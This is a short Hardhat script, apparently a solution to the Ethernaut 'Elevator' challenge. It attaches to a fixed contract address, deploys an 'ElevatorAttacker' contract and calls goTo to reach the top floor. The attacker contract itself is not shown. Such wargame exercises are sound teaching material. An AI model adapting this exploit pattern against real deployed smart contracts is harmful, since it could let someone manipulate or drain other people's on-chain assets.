const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0x9Dc1Fc8F1f549236b14D1962b11aF5AeEA49F597";
const CONTRACT_NAME = "Elevator";
const ATTACKER_NAME = "ElevatorAttacker";

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerContractFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerContractFactory.deploy();
  await attackerContract.deployed();

  const tx = await attackerContract.goTo(1, contract.address);
  await tx.wait();
  console.log("Look u make what do u wanna do 🏙");


}

main().catch(error => {
  console.error(error);
  process.exit(1);
});